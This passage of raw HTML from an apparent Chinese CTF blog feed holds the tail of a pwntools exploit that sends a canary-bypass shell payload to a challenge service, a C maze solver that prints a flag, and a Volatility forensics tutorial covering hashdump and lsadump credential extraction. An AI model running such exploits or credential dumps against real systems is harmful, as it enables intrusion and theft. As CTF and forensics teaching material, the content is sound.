operator">*</span><span class="token number">28</span> <span class="token operator">+</span> shell <span class="token operator">+</span> p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'NKCTF: \n'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            exp<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">continue</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="baby-heap（待复现）"><a href="#baby-heap（待复现）" class="headerlink" title="baby_heap（待复现）"></a>baby_heap（待复现）</h2><h2 id="note（待复现）"><a href="#note（待复现）" class="headerlink" title="note（待复现）"></a>note（待复现）</h2><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="ez-baby-apk（待复现）"><a href="#ez-baby-apk（待复现）" class="headerlink" title="ez_baby_apk（待复现）"></a>ez_baby_apk（待复现）</h2><h2 id="PMKF"><a href="#PMKF" class="headerlink" title="PMKF"></a>PMKF</h2><ul><li>迷宫题，没啥好说的；只是它把一个字节的每两位当做一步，并且异或的时候只是取的低字节</li></ul><blockquote><p>要多注意变量的类型，是一个字节还是两个字节等待&gt;_&lt;</p></blockquote><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;string.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"crypt.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;Windows.h&gt;</span></span><span class="token keyword">char</span> map<span class="token punctuation">[</span><span class="token number">11</span> <span class="token operator">*</span> <span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span>  <span class="token char">'N'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span>  <span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span>  <span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span>  <span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span>  <span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span>  <span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span>  <span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span>  <span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span>  <span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'K'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span>  <span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span> <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">int</span> dir<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token operator">-</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">int</span> path<span class="token punctuation">[</span><span class="token number">11</span> <span class="token operator">*</span> <span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>bool visited<span class="token punctuation">[</span><span class="token number">11</span> <span class="token operator">*</span> <span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> false <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">int</span> ans<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>bool <span class="token function">check</span><span class="token punctuation">(</span><span class="token keyword">int</span> l<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span>l <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> l <span class="token operator">&gt;=</span> <span class="token number">11</span> <span class="token operator">*</span> <span class="token number">18</span> <span class="token operator">||</span> map<span class="token punctuation">[</span>l<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'*'</span><span class="token punctuation">)</span><span class="token keyword">return</span> false<span class="token punctuation">;</span><span class="token keyword">else</span><span class="token keyword">return</span> true<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> path<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">int</span> len<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span>map<span class="token punctuation">[</span>l<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'K'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">int</span> tmp <span class="token operator">=</span> <span class="token punctuation">(</span>path<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>path<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>path<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>path<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>ans<span class="token punctuation">[</span>i <span class="token operator">/</span> <span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> tmp<span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%x "</span><span class="token punctuation">,</span> tmp<span class="token punctuation">)</span><span class="token punctuation">;</span>i <span class="token operator">+=</span> <span class="token number">4</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">int</span> tmp <span class="token operator">=</span> l <span class="token operator">+</span> dir<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">check</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>visited<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>visited<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span> <span class="token operator">=</span> true<span class="token punctuation">;</span>path<span class="token punctuation">[</span>len<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span><span class="token function">dfs</span><span class="token punctuation">(</span>tmp<span class="token punctuation">,</span> path<span class="token punctuation">,</span> len<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>visited<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span> <span class="token operator">=</span> false<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> head <span class="token operator">=</span> <span class="token string">"5nkman"</span><span class="token punctuation">;</span><span class="token keyword">int</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token function">dfs</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">,</span> path<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">6</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>sum <span class="token operator">+=</span> head<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n%d"</span><span class="token punctuation">,</span> sum<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n%d"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span>sum<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nnkctf{05"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%x"</span><span class="token punctuation">,</span> head<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>ans<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span>sum<span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%x"</span><span class="token punctuation">,</span> ans<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/*nkctf{056e6b6d614fef7eb0044154700bea9eeb043aa}*/</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="earlier"><a href="#earlier" class="headerlink" title="earlier"></a>earlier</h2><ul><li>静态反调试</li></ul><p>这题加了很多静态反调试，但都可以很容易去除。这里写的详细一点，复习一下静态反调试技术。</p>]]></content>
      
      
      <categories>
          
          <category> CTF-WP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>volatility内存取证</title>
      <link href="/2023/04/21/volatility-nei-cun-qu-zheng/"/>
      <url>/2023/04/21/volatility-nei-cun-qu-zheng/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Volatility是一款非常强大的内存取证工具,它是由来自全世界的数百位知名安全专家合作开发的一套工具, 可以用于windows,linux,mac osx,android等系统内存取证。Volatility是一款开源内存取证框架，能够对导出的内存镜像进行分析，通过获取内核数据结构，使用插件获取内存的详细情况以及系统的运行状态。</p><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><h2 id="命令格式"><a href="#命令格式" class="headerlink" title="命令格式"></a>命令格式</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">vol.py <span class="token parameter variable">-f</span> <span class="token punctuation">[</span>image<span class="token punctuation">]</span> <span class="token parameter variable">--profile</span><span class="token operator">=</span><span class="token punctuation">[</span>profile<span class="token punctuation">]</span> <span class="token punctuation">[</span>plugin<span class="token punctuation">]</span>image: 内存镜像文件名profile: 操作系统plugin: 插件参数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>所以在分析之前我们需要确定镜像的操作系统，命令如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">vol.py <span class="token parameter variable">-f</span> <span class="token punctuation">[</span>image<span class="token punctuation">]</span> imageinfo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/04/21/volatility-nei-cun-qu-zheng/0.png"></p><h2 id="常见命令插件"><a href="#常见命令插件" class="headerlink" title="常见命令插件"></a>常见命令插件</h2><h3 id="注册表相关"><a href="#注册表相关" class="headerlink" title="注册表相关"></a>注册表相关</h3><h4 id="printkey"><a href="#printkey" class="headerlink" title="printkey"></a><code>printkey</code></h4><p><strong>：显示指定注册表中包含的子项、值、数据和数据类型，它默认情况下会打印指定注册表项的信息</strong></p><ul><li><strong>查看内存镜像中的用户(通过注册表项中的SAM键查看该计算机创建的用户信息)：<code>printkey -K "SAM\Domains\Account\Users\Names"</code></strong></li></ul><p><img src="/2023/04/21/volatility-nei-cun-qu-zheng/1.png"></p><h4 id="hashdump"><a href="#hashdump" class="headerlink" title="hashdump"></a><code>hashdump</code></h4><p><strong>：提取和解密存储在注册表中的缓存域凭证(cached domain credentials),(即查看用户名密码信息，密码信息是hash值，需要john爆破)</strong></p><p><img src="/2023/04/21/volatility-nei-cun-qu-zheng/2.png"></p><h4 id="lsadump"><a href="#lsadump" class="headerlink" title="lsadump"></a><code>lsadump</code></h4><p><strong>：从注册表中转储<code>LSA secrets</code>，它会显示诸如默认密码(针对启用了自动登录的系统)，<code>RDP</code>公钥和<code>DPAPI</code>使用的凭证等信息</strong></p><p><img src="/2023/04/21/volatility-nei-cun-qu-zheng/3.png"></p><h4 id="hivescan"><a href="#hivescan" class="headerlink" title="hivescan"></a><code>hivescan</code></h4><p><strong>：查找内存中的CMHIVE(registry hives，注册表配置单元)，单独只用这一个插件用处不大，一般用比它更进一步的插件，比如hivelist</strong></p><h4 id="hivelist"><a href="#hivelist" class="headerlink" title="hivelist"></a><code>hivelist</code></h4><p><strong>：在内存中查找注册表配置单元的虚拟地址以及磁盘上相应配置单元的完整路径</strong></p><h4 id="hivedump"><a href="#hivedump" class="headerlink" title="hivedump"></a><code>hivedump</code></h4><p><strong>：递归列出配置单元中所有子项</strong></p><h4 id="userassist"><a href="#userassist" class="headerlink" title="userassist"></a><code>userassist</code></h4><p><strong>：获取UserAssist键。Windows在系统注册表数据库中维护UserAssit键来跟踪执行的程序，这些键中存储了执行次数和上次执行的时间</strong></p><h4 id="shellbags"><a href="#shellbags" class="headerlink" title="shellbags"></a><code>shellbags</code></h4><p><strong>：解析并打印从注册表中获取的Shellbag信息。其中shellbag是一组注册表项，被windows用来维护使用资源管理器时文件夹的大小、视图、图表和位置；即使在删除目录以后，Shellbags仍会保留目录的信息，可以用来枚举过去装入的卷，删除的文件和用户操作，重建用户活动</strong></p><h4 id="shimcache"><a href="#shimcache" class="headerlink" title="shimcache"></a><code>shimcache</code></h4><p><strong>：该插件分析应用程序兼容性缓冲区缓存注册表项(Application Compatibility Shim Cache)。Shim是用APIHook来实现Windows的各项兼容性的</strong></p><h4 id="getservicesids"><a href="#getservicesids" class="headerlink" title="getservicesids"></a><code>getservicesids</code></h4><p><strong>：计算出服务的SID(Security Identifier)并以Python格式输出以供将来使用</strong></p><h4 id="dumpregistry"><a href="#dumpregistry" class="headerlink" title="dumpregistry"></a><code>dumpregistry</code></h4><p><strong>：将注册表配置单元转储到磁盘</strong></p><h3 id="进程与DLLs相关"><a href="#进程与DLLs相关" class="headerlink" title="进程与DLLs相关"></a>进程与DLLs相关</h3><h4 id="pslist"><a href="#pslist" class="headerlink" title="pslist"></a><code>pslist</code></h4><p><strong>：列举出系统进程，该插件通过遍历PsActiveProcessHead指向的双向链表，来列举出系统进程，<font color="green">但它不能检测到隐藏或者解链的进程，<code>psscan</code>可以</font></strong></p><p><img src="/2023/04/21/volatility-nei-cun-qu-zheng/4.png"></p><h4 id="psscan"><a href="#psscan" class="headerlink" title="psscan"></a><code>psscan</code></h4><p><strong>：使用池标签扫描(_POOL_HEADER)来枚举进程，可以找到先前已终止(不活动)的进程以及被rootkit隐藏或解链的进程</strong></p><h4 id="pstree"><a href="#pstree" class="headerlink" title="pstree"></a><code>pstree</code></h4><p><strong>：以树的形式查看进程列表，和<code>pslist</code>一样，也无法检测隐藏或解链的进程</strong></p><h4 id="psdispscan"><a href="#psdispscan" class="headerlink" title="psdispscan"></a><code>psdispscan</code></h4><p><strong>：和<code>psscan</code>相似，只不过它是通过扫描DISPATCHER_HEADER，来枚举进程</strong></p><h4 id="dlllist"><a href="#dlllist" class="headerlink" title="dlllist"></a><code>dlllist</code></h4><p><strong>：显示已加载的dll</strong> </p><h4 id="dlldump"><a href="#dlldump" class="headerlink" title="dlldump"></a><code>dlldump</code></h4><p><strong>：从进程的内存空间提取DLL并转储到磁盘分析</strong></p><h4 id="handles"><a href="#handles" class="headerlink" title="handles"></a><code>handles</code></h4><p><strong>：显示进程中打开的句柄</strong></p><h4 id="getsids"><a href="#getsids" class="headerlink" title="getsids"></a><code>getsids</code></h4><p><strong>：查看与进程关联的SID(Security Identifiers，安全标识符)</strong></p><h4 id="cmdscan"><a href="#cmdscan" class="headerlink" title="cmdscan"></a><code>cmdscan</code></h4><p><strong>：该插件搜索<font color="red">win7以前</font>的操作系统版本上的conhost.exe来查找攻击者通过控制台输入的命令</strong></p><h4 id="consoles"><a href="#consoles" class="headerlink" 